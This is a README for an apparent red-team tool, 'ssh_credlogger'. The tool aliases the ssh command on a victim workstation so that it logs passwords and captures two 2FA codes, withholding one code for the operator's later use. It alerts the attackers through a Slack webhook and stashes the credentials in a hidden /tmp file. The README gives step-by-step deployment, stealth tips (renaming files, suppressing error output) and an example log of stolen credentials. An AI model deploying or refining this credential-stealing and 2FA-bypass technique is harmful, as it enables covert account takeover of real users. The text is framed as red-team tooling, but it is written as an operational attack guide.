**ssh_credlogger**

An expect + sh script that logs ssh passwords, prompts users for two 2fa codes, and writes them to a local file.  The Red Team will then be alerted via a Slack webhook and can view creds at victim-workstation:/tmp/.data.  

The scripts will prompt for two 2fa codes - after the second code is input, the FIRST code is sent to the ssh server, leaving the operator with a still-valid passcode #1 to copy and use whenever they want.

**Example log:**

victim-workstation:~ $ cat /tmp/.data<br>
Wed Dec  1 12:10:02 CST 2021<br>
ssh top_secret_server<br>
user = kcawlfield<br>
1st password prompt = password_here<br>
2nd password prompt = password_here<br>
2nd passcode = yubikey_output_operator_can_copy_and_use_sdffklfjkdjflkdjfdk<br>

**Steps:**

- Copy this file and ssh_snoop.sh to victim workstation, renamed to something less obvious
- On victim workstation run alias ssh="/path/to/this/file.expect 2>/dev/null"
    (the stderr redirect prevents a 10-line error message when the user exits ssh)
- Ensure your alias links to the correct path for this file
- Ensure the "spawn" command below links to the correct path for the renamed ssh_credlogger.sh
- You may need to tweak the strings expect listens for (like "Passcode:(asterisk)") to match your target's environment

**Things to improve:**

    - passcode2 does not stream out to tty, we only see passcode1 come out after a delay in one fell swoop
    - when entering passcode2 the user may notice the "key" cursor instead of the normal cursor

